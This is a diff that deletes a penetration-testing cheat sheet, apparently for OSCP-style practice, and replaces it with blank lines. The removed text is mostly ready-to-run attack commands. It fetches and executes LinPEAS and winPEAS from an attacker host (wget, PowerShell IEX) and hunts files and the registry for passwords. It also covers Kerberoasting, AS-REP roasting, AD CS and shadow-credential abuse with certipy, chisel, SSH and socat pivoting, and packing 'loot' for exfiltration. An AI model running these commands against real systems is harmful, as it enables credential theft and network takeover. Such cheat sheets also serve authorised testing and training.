-# Download and run LinPEAS from attacker host (example)
-wget http://$localip/linpeas.sh -O /tmp/linpeas.sh; chmod +x /tmp/linpeas.sh; /tmp/linpeas.sh
 
 
-######################################################################
-# WINDOWS PRIVILEGE ESCALATION - QUICK ENUM
-######################################################################
 
-# Search for passwords inside files on Windows
-findstr /S /I "password" C:\*.txt
-findstr /S /I "password" C:\*.xml
-findstr /S /I "password" C:\*.ini
-findstr /S /I "password" C:\*.config
 
 
-# Who am I and privs
-whoami
-whoami /all
 
-# OS & patch info
-systeminfo
 
-# Installed hotfixes (missing patches)
-wmic qfe
 
-# List users and groups
-net user
-net localgroup
 
-# Running processes
-tasklist
 
-# Network connections
-netstat -ano
 
-# Scheduled tasks
-schtasks /query /fo LIST /v
 
-# List services
-sc query state= all
 
-# Download and run winPEAS (example PowerShell)
-powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$localip/winPEAS.ps1')"
 
-# Enumerate logged-in users (often reveals admins)
-qwinsta
 
-# Search registry for password strings
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
 
-# Check for AlwaysInstallElevated misconfiguration (priv-escalation)
-reg query HKCU\Software\Policies\Microsoft\Windows\Installer
-reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 
-# List installed applications (useful for known-vuln software)
-wmic product get name,version
 
-######################################################################
-# ACTIVE DIRECTORY ENUMERATION - BLOODHOUND
-######################################################################
 
-# Collect AD data with SharpHound on Windows target
-Sharphound.exe -c All -d $domain -zipfilename loot_bloodhound.zip
 
-# Then:
-# - Download loot_bloodhound.zip to Kali
-# - Import into BloodHound GUI
-# - Analyze attack paths (Shortest Path to DA, etc.)
 
-# BloodHound collection from Linux (no Windows shell needed)
-bloodhound-python -d $domain -u $user -p "$password" -ns $targetip -c All
 
-######################################################################
-# PIVOTING & PORT FORWARDING - CHISEL / SSH / SOCAT
-######################################################################
 
-########################
-# CHISEL PIVOTING
-########################
 
-# Start Chisel server on Kali (reverse mode SOCKS proxy)
-chisel server -p 9001 --reverse
 
-# On compromised target (client) - create reverse SOCKS proxy to Kali
-chisel client $localip:9001 R:socks
 
-# Use proxychains with SOCKS5 at 127.0.0.1:1080 (edit /etc/proxychains.conf)
-# Example proxied Nmap scan:
-# proxychains nmap -sT -Pn -n 10.10.20.10 -p 80,445
 
 
-########################
-# SSH PORT FORWARDING
-########################
 
-# Local port forward: forward Kali port 13389 to target's 3389 via pivot host
-ssh -L 13389:internal_rdp_host:3389 $user@$targetip
 
-# Remote port forward: expose local service 80 through remote host on port 8080
-ssh -R 0.0.0.0:8080:127.0.0.1:80 $user@$targetip
 
-# Dynamic SOCKS proxy via SSH - full pivot of traffic
-ssh -D 9050 $user@$targetip
 
 
-########################
-# SOCAT PORT FORWARDING
-########################
 
-# Socat port forward on Linux pivot host - forward local :8080 to 10.10.20.10:80
-socat TCP-LISTEN:8080,fork TCP:10.10.20.10:80
 
 
-######################################################################
-# ACTIVE DIRECTORY ATTACK CHEATSHEET (IMPACKET / CERTIPY / KERBRUTE)
-######################################################################
 
-###############################
-# AS-REP ROASTING
-###############################
 
-# Enumerate AS-REP roastable users (-no-pass required)
-impacket-GetNPUsers $domain/ -dc-ip $targetip -no-pass -usersfile users.txt
 
 
-###############################
-# KERBEROASTING
-###############################
 
-# Request TGS tickets for all SPNs
-impacket-GetUserSPNs $domain/$user:$password -dc-ip $targetip -request
 
-# Request TGS tickets and write JtR-format hashes
-impacket-GetUserSPNs $domain/$user:$password -dc-ip $targetip -request -outputfile kerberoast_hashes.txt -format john
 
-# Export in offline audit format (alt filename)
-impacket-GetUserSPNs $domain/$user:$password -dc-ip $targetip -request -outputfile kerb_hashes.txt -format john
 
 
-###############################
-# KERBRUTE-STYLE ENUMERATION 
-###############################
 
-# Probe Kerberos for valid usernames
-kerbrute userenum -d $domain --dc $targetip users.txt
 
 
-###############################
-# CERTIFICATE SERVICES (AD CS) ENUM 
-###############################
 
-# 1. Enumerate AD CS
-certipy find -u $user -p $password -dc-ip $targetip -domain $domain
 
-# 2. Find vulnerable certificate templates (ESC1–ESC8)
-certipy find -u $user -p $password -dc-ip $targetip -domain $domain -vulnerable
 
-# 3. Request a certificate from a template
-certipy req -u $user -p $password -dc-ip $targetip -domain $domain -template $template -out cert.pfx
 
-# 4. Authenticate with the certificate
-certipy auth -pfx cert.pfx -dc-ip $targetip
 
-# 5. Convert a certificate (PEM)
-certipy cert -pfx cert.pfx -key key.pem -cert cert.pem
 
-#6 Shadow credentials let you log in as another user because you add your own key to their AD entry.
-certipy shadow -u $user -p $password -dc-ip $targetip -account targetuser
 
-######################################################################
-# MISC / GENERAL
-######################################################################
 
-# Save terminal session to file (good for OSCP reporting)
-script -t 2> timing.log -a session.log
 
-# Compress and exfiltrate directory from Linux
-tar czf loot.tar.gz /path/to/loot
 
-# Simple Python HTTP server on Kali for file hosting
-python3 -m http.server 80
 
-# Download from Python server via curl
-curl http://$localip/filename -o filename
 
-# Download via certutil on Windows
-certutil -urlcache -split -f http://$localip/file.exe file.exe
 
-######################################################################
 
-######################################################################
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
